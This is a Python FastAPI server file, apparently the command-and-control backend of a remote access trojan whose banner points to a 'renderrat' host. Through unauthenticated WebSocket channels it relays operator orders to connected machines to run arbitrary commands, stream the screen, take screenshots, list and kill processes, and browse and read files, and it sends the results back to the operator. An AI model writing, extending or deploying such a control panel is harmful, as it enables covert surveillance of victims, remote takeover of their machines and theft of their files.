from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from typing import Dict, Set
import json
import os

app = FastAPI()

# ===============================
# TEMPLATES + STATIC
# ===============================

templates = Jinja2Templates(directory="templates")

if os.path.exists("static"):
    app.mount("/static", StaticFiles(directory="static"), name="static")

# ===============================
# CONNECTIONS
# ===============================

clients: Dict[str, WebSocket] = {}
admins: Set[WebSocket] = set()

# Track which admin is watching which client (for stream routing)
admin_watching: Dict[WebSocket, str] = {}   # admin_ws → client_id

# ===============================
# PAGES
# ===============================

@app.get("/", response_class=HTMLResponse)
async def admin_page(request: Request):
    return templates.TemplateResponse("admin.html", {"request": request})

@app.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "clients_online": len(clients),
        "admins_online": len(admins)
    }

# ===============================
# CLIENT WEBSOCKET
# ===============================

@app.websocket("/ws/client/{client_id}")
async def client_ws(websocket: WebSocket, client_id: str):
    await websocket.accept()
    clients[client_id] = websocket
    print(f"[CLIENT +] {client_id} | Total: {len(clients)}")
    await notify_admins_clients()

    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            msg_type = message.get("type")

            # ── Stream frame — forward nhanh nhất có thể ──────────
            if msg_type == "stream_frame":
                await broadcast_stream_frame(client_id, {
                    "type": "stream_frame",
                    "client_id": client_id,
                    "image": message.get("image"),
                    "ts": message.get("ts")
                })

            # ── Screenshot ────────────────────────────────────────
            elif msg_type == "screenshot":
                await broadcast_to_admins({
                    "type": "screenshot",
                    "client_id": client_id,
                    "image": message.get("image")
                })

            # ── Command result ────────────────────────────────────
            elif msg_type == "command_result":
                await broadcast_to_admins({
                    "type": "command_result",
                    "client_id": client_id,
                    "output": message.get("output")
                })

            # ── Client connected (sysinfo) ─────────────────────────
            elif msg_type == "client_connected":
                await broadcast_to_admins({
                    "type": "client_info",
                    "client_id": client_id,
                    "sysinfo": message.get("sysinfo")
                })

            # ── Other data (sysinfo, processes, files…) ───────────
            else:
                await broadcast_to_admins({
                    "type": msg_type,
                    "client_id": client_id,
                    "data": message.get("data"),
                    "result": message.get("result"),
                    "path": message.get("path")
                })

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[CLIENT ERR] {client_id}: {e}")
    finally:
        if client_id in clients:
            del clients[client_id]
        # Dừng stream cho các admin đang xem client này
        await stop_stream_for_client(client_id)
        print(f"[CLIENT -] {client_id} | Total: {len(clients)}")
        await notify_admins_clients()

# ===============================
# ADMIN WEBSOCKET
# ===============================

@app.websocket("/ws/admin")
async def admin_ws(websocket: WebSocket):
    await websocket.accept()
    admins.add(websocket)
    print(f"[ADMIN +] Total: {len(admins)}")
    await notify_admins_clients()

    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            msg_type = message.get("type")
            client_id = message.get("client_id")

            # ── Stream control ────────────────────────────────────
            if msg_type == "start_stream":
                if client_id and client_id in clients:
                    admin_watching[websocket] = client_id
                    await clients[client_id].send_text(json.dumps({
                        "type": "start_stream"
                    }))
                    print(f"[STREAM] Admin started stream → {client_id}")

            elif msg_type == "stop_stream":
                if client_id and client_id in clients:
                    if websocket in admin_watching:
                        del admin_watching[websocket]
                    # Dừng stream nếu không còn admin nào xem
                    watchers = [a for a, c in admin_watching.items() if c == client_id]
                    if not watchers:
                        await clients[client_id].send_text(json.dumps({
                            "type": "stop_stream"
                        }))
                    print(f"[STREAM] Admin stopped stream → {client_id}")

            # ── Screenshot ────────────────────────────────────────
            elif msg_type == "request_screenshot":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "request_screenshot",
                        "quality": message.get("quality", 85)
                    }))

            # ── Command ───────────────────────────────────────────
            elif msg_type == "command":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "command",
                        "command": message.get("command")
                    }))

            # ── Sysinfo ───────────────────────────────────────────
            elif msg_type == "request_sysinfo":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({"type": "request_sysinfo"}))

            # ── Processes ─────────────────────────────────────────
            elif msg_type == "request_processes":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({"type": "request_processes"}))

            elif msg_type == "kill_process":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "kill_process",
                        "pid": message.get("pid")
                    }))

            # ── Files ─────────────────────────────────────────────
            elif msg_type == "list_directory":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "list_directory",
                        "path": message.get("path", ".")
                    }))

            elif msg_type == "read_file":
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "read_file",
                        "path": message.get("path")
                    }))

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[ADMIN ERR] {e}")
    finally:
        admins.discard(websocket)
        # Dừng stream nếu admin đang xem
        if websocket in admin_watching:
            client_id = admin_watching.pop(websocket)
            watchers = [a for a, c in admin_watching.items() if c == client_id]
            if not watchers and client_id in clients:
                await clients[client_id].send_text(json.dumps({"type": "stop_stream"}))
        print(f"[ADMIN -] Total: {len(admins)}")

# ===============================
# HELPERS
# ===============================

async def notify_admins_clients():
    await broadcast_to_admins({
        "type": "clients",
        "clients": list(clients.keys())
    })

async def broadcast_to_admins(message: dict):
    dead = set()
    for admin in admins:
        try:
            await admin.send_text(json.dumps(message))
        except Exception:
            dead.add(admin)
    for d in dead:
        admins.discard(d)

async def broadcast_stream_frame(client_id: str, message: dict):
    """Chỉ gửi stream frame cho admin đang xem client này"""
    dead = set()
    watchers = [admin for admin, cid in admin_watching.items() if cid == client_id]
    payload = json.dumps(message)
    for admin in watchers:
        try:
            await admin.send_text(payload)
        except Exception:
            dead.add(admin)
    for d in dead:
        admins.discard(d)
        admin_watching.pop(d, None)

async def stop_stream_for_client(client_id: str):
    """Notify admins đang xem client vừa disconnect"""
    watching_admins = [a for a, c in admin_watching.items() if c == client_id]
    for admin in watching_admins:
        admin_watching.pop(admin, None)
        try:
            await admin.send_text(json.dumps({
                "type": "stream_stopped",
                "client_id": client_id,
                "reason": "client_disconnected"
            }))
        except Exception:
            pass

# ===============================
# STARTUP
# ===============================

@app.on_event("startup")
async def startup_event():
    print("=" * 50)
    print("  Server Started!")
    print("=" * 50)
    print("  Admin : https://renderrat.onrender.com")
    print("  Client: wss://renderrat.onrender.com/ws/client/{id}")
    print("=" * 50)
